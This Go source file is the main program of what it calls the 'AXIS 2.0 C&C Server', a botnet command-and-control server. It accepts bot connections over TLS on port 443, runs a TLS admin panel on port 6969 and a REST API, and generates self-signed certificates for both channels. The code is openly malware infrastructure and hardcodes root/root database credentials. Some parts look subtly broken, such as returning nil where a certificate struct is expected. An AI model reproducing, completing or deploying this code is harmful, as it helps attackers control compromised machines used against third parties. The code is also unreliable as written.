package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"encoding/pem"
	"errors"
	"fmt"
	"net"
	"os"
	"time"

	"crypto/x509/pkix"
)

/*
 * AXIS 2.0 C&C Server
 * Hybrid: Traditional CNC + P2P
 */

const DatabaseAddr string = "127.0.0.1:3306"
const DatabaseUser string = "root"
const DatabasePass string = "root"
const DatabaseTable string = "AXIS2"

/* Bot connection ports */
const BotListenAddr string = "0.0.0.0:443"           /* Traditional CNC (TLS) */
const TelnetTLSListenAddr string = "0.0.0.0:6969"    /* Admin panel */
const APIListenAddr string = "0.0.0.0:3779"          /* REST API */

const TLSCertPath string = "tls_cert.pem"
const TLSKeyPath string = "tls_key.pem"
const BotTLSCertPath string = "bot_tls_cert.pem"
const BotTLSKeyPath string = "bot_tls_key.pem"

var clientList *ClientList = NewClientList()
var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)

func main() {
	/* Load bot TLS certificate */
	botCert, err := getOrCreateBotTLSCertificate()
	if err != nil {
		fmt.Printf("Failed to load bot TLS certificate: %v\n", err)
		return
	}

	/* TLS config for bot connections */
	botTLSConfig := &tls.Config{
		Certificates: []tls.Certificate{botCert},
		MinVersion:   tls.VersionTLS13,
		CipherSuites: []uint16{
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_CHACHA20_POLY1305_SHA256,
		},
	}

	/* Start traditional CNC bot listener (TLS on port 443) */
	botListener, err := tls.Listen("tcp", BotListenAddr, botTLSConfig)
	if err != nil {
		fmt.Printf("Failed to start bot listener: %v\n", err)
		return
	}

	go func() {
		fmt.Printf("AXIS 2.0 Bot Server (TLS) listening on %s\n", BotListenAddr)
		for {
			conn, err := botListener.Accept()
			if err != nil {
				fmt.Printf("Failed to accept bot connection: %v\n", err)
				break
			}
			go handleBotConnection(conn)
		}
	}()

	/* Start admin panel (TLS telnet on port 6969) */
	if TelnetTLSListenAddr != "" {
		cert, err := getOrCreateTLSCertificate()
		if err != nil {
			fmt.Printf("Failed to load TLS certificate: %v\n", err)
			return
		}

		tlsConfig := &tls.Config{
			Certificates: []tls.Certificate{cert},
			MinVersion:   tls.VersionTLS12,
			CipherSuites: []uint16{
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
			},
		}

		tlsListener, err := tls.Listen("tcp", TelnetTLSListenAddr, tlsConfig)
		if err != nil {
			fmt.Printf("Failed to start admin panel: %v\n", err)
			return
		}

		go func() {
			fmt.Printf("AXIS 2.0 Admin Panel (TLS) listening on %s\n", TelnetTLSListenAddr)
			for {
				conn, err := tlsListener.Accept()
				if err != nil {
					fmt.Printf("Failed to accept admin connection: %v\n", err)
					break
				}
				go NewAdmin(conn).Handle()
			}
		}()
	}

	/* Start API server */
	if APIListenAddr != "" {
		api := NewAPIServer(APIListenAddr)
		go api.Start()
	}

	/* Status */
	fmt.Println("")
	fmt.Println("AXIS 2.0 C&C Server Running")
	fmt.Println("===========================")
	fmt.Printf("Bots:      TLS on %s\n", BotListenAddr)
	fmt.Printf("Admin:     TLS on %s\n", TelnetTLSListenAddr)
	fmt.Printf("API:       HTTP on %s\n", APIListenAddr)
	fmt.Println("")
	fmt.Println("P2P Network: UDP 49152/49153 (standalone)")
	fmt.Println("")

	/* Keep running */
	for {
		time.Sleep(60 * time.Second)
	}
}

func handleBotConnection(conn net.Conn) {
	defer conn.Close()

	/* Handshake */
	conn.SetDeadline(time.Now().Add(30 * time.Second))
	conn.Write([]byte{0x00, 0x01})
	conn.SetDeadline(time.Time{})

	/* Start bot handler */
	NewBot(conn, 0x01, "").Handle()
}

func readXBytes(conn net.Conn, buf []byte) error {
	tl := 0
	for tl < len(buf) {
		n, err := conn.Read(buf[tl:])
		if err != nil {
			return err
		}
		if n <= 0 {
			return errors.New("Connection closed")
		}
		tl += n
	}
	return nil
}

func netshift(prefix uint32, netmask uint8) uint32 {
	return uint32(prefix >> (32 - netmask))
}

func getOrCreateTLSCertificate() (tls.Certificate, error) {
	certBytes, certErr := os.ReadFile(TLSCertPath)
	keyBytes, keyErr := os.ReadFile(TLSKeyPath)

	if certErr == nil && keyErr == nil {
		cert, err := tls.X509KeyPair(certBytes, keyBytes)
		if err == nil {
			return cert, nil
		}
	}

	fmt.Println("Generating admin TLS certificate...")

	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, err
	}

	template := x509.Certificate{
		SerialNumber: nil,
		Subject: pkix.Name{
			Organization: []string{"AXIS 2.0"},
			CommonName:   "AXIS 2.0 Admin",
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
	if err != nil {
		return nil, err
	}

	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(privateKey)})

	os.WriteFile(TLSCertPath, certPEM, 0644)
	os.WriteFile(TLSKeyPath, keyPEM, 0600)

	fmt.Printf("Admin cert: %s, %s\n", TLSCertPath, TLSKeyPath)
	return tls.X509KeyPair(certPEM, keyPEM)
}

func getOrCreateBotTLSCertificate() (tls.Certificate, error) {
	certBytes, certErr := os.ReadFile(BotTLSCertPath)
	keyBytes, keyErr := os.ReadFile(BotTLSKeyPath)

	if certErr == nil && keyErr == nil {
		cert, err := tls.X509KeyPair(certBytes, keyBytes)
		if err == nil {
			return cert, nil
		}
	}

	fmt.Println("Generating bot TLS certificate...")

	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, err
	}

	template := x509.Certificate{
		SerialNumber: nil,
		Subject: pkix.Name{
			Organization: []string{"AXIS 2.0"},
			CommonName:   "AXIS 2.0 Bot",
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
	if err != nil {
		return nil, err
	}

	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(privateKey)})

	os.WriteFile(BotTLSCertPath, certPEM, 0644)
	os.WriteFile(BotTLSKeyPath, keyPEM, 0600)

	fmt.Printf("Bot cert: %s, %s\n", BotTLSCertPath, BotTLSKeyPath)
	return tls.X509KeyPair(certPEM, keyPEM)
}
